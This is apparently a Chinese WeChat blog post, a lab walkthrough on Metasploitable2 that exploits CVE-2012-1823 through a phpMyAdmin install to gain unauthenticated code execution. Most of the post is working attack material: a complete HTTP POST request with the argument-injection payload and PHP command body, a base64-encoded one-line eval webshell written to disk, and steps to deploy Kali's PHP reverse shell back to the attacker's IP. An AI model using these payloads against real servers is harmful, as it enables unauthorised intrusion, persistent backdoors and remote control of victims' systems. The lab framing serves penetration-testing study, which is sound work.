---
title: phpmyadminxa0未授权 getshell
url: https://mp.weixin.qq.com/s/cXPVzV1W0nmKsnSsFAthgQ
source: Doonsec's feed
date: 2026-07-10
fetch_date: 2026-07-11T05:00:21.660093
---

# phpmyadminxa0未授权 getshell

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lFfjZayicKlEzFz5Ya73cXSkeJOUPumgrIxnfnvYmOSWG45R1gbbWzlyJY34yibypsyKbnyCZE0vmm6kWcbicgA0QC0eYcuxTSXlDZuAjh8fiao/0?wx_fmt=jpeg)

# phpmyadmin 未授权 getshell

原创

The Ju1y
The Ju1y

蚁景网安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

#### 前言

做渗透测试的时候偶然发现，phpmyadmin少见的打法，以下就用靶场进行演示了。

#### 0x01漏洞发现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlFKbXCmlQjuDpsHfY0dQ8cWHibI3gewKbDQG7ndgxFOMuejKgrUfUnbBzictslHJpmOzOqwqKtc0j0oYw3sRz1HQCTtAibZfd9ibvg/640?wx_fmt=png&from=appmsg "null")

环境搭建使用metasploitable2,可在网上搜索下载，搭建很简单这里不多说了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlGlPIFyVNfpqTMECLthLyoCArODtlXQUXjIKpzoGRKdmfZXEiaZetg6jksr21fGibDdgZiamkGERUce3JbeoSgJsQXpibiaQaFpIoRM/640?wx_fmt=png&from=appmsg "null")

发现phpmyadmin，如果这个时候无法登陆，且也没有前台的漏洞，可以继续在这个phpmyadmin目录下做文章。

发现setup

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlGaicOEhnvHYlxGn3Siclke6KXYOAZehvgtECybdIetHgXpt4hNHvcmICRO5Vfpv082N3d0ib0LUh2hy5MzCF9VBRGV6ibicwia6HdZA/640?wx_fmt=png&from=appmsg "null")

#### 0x02漏洞利用

进行漏洞利用

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlEFqfLY0Dslop8WTEmHl3Xjyqds9eoVg3BvQ6DvWlosZ6kJbSpxEszCVk1Xxl7ojonbSX31O5bTeCyp254SckKIyn9UwpqwalI/640?wx_fmt=png&from=appmsg "null")

https://juejin.cn/post/7042901479388086285

```
POST
/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
HTTP/1.1

Host: 192.168.48.143

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie: phpMyAdmin=bdbb427ed9c5e8616fe90261adcfb7229d6ca189;
pma_lang=en-utf-8

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 36

\<?php

passthru(\'id\');

die();

?\>
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFfjZayicKlHD3X081xDGy6AG99qr5XdXXw5jHpnvCOKf5dQV7n4B6eFcibOKVicoMdNRVg41wLk39ibH2Gl2HrBbZbxLb2NybntloFibezf93eQ/640?wx_fmt=png&from=appmsg "null")

这里利用的是CVE-2012-1823

?-d+allow\_url\_include%3don+-d+auto\_prepend\_file%3dphp%3a//input

解码后

?-d allow\_url\_include=on -d auto\_prepend\_file=php://input

开启allow\_url\_include和auto\_prepend\_file

其中allow\_url\_include可以远程文件包含，auto\_prepend\_file加载php://input

其中php://input 可以读取http entity
body中指定长度的值，由Content-Length指定长度

写一句话木马getshell

echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==" | base64 -d >shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/lFfjZayicKlEfjBjOJmXiaNmBmxicKJhOa1FJSibJrdInhk3TJk1FmaIe5EJicImW4axcH8MyYgmBaX5qMNBbO6Hy1fctILDoHhWlYnIicKysxSpo/640?wx_fmt=png&from=appmsg "null")![](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlHFibMpkJFP9UEwRC8pWV59OkkSiaPLxjaLLqF1H0tPmneQ0B86RxkLiaJhxJUwOKTn3OpATcoeWTNibNtFdEEc6dX7hddEbd61T0E/640?wx_fmt=png&from=appmsg "null")

#### 0x03反弹shell

利用kali现成的

cp /usr/share/webshells/php/php-reverse-shell.php ./1.php

修改这个ip

![](https://mmbiz.qpic.cn/mmbiz_png/lFfjZayicKlFFPW9JqUGNfEQiauUoACIyOxAIXHG3ZcWEPleJCzuK7fQc6FUeLsthQ3ibCGr2x8D4j3nGNJV1oyp9w26pje5Ev5qRYGXGmtXC4/640?wx_fmt=png&from=appmsg "null")

修改ip

![](https://mmbiz.qpic.cn/mmbiz_png/lFfjZayicKlH18zRb1AhowMkrbOfWNZtzU1d1WUiccFlK8EBYQ7wnn4CbgMTOZ8SjIJlAeCrro9vHurwv38WjiaLWicxic2cJyLg1V03uBXVYRng/640?wx_fmt=png&from=appmsg "null")![](https://mmbiz.qpic.cn/sz_mmbiz_png/lFfjZayicKlFUM7bb7eqIDL8l0K0icMI676sicU3vtavtibQCZTGSYp65ZBA9xrqJW4MGibny2sPkRF7NCT0H5EZiagLpeolQvsDToRxN3DmxgZ8s/640?wx_fmt=png&from=appmsg "null")

反弹shell成功，且无文件生成。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10)

学习网安实战技术，戳“阅读原文”

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/TL4Y9UAcgruasR1ULCzS2icYoNn4Yz5aKdDv4u2Z8JA7ru620vsrtZjDIFMQzJFyicnn9YgOQQtbfraAJvNbwvAA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过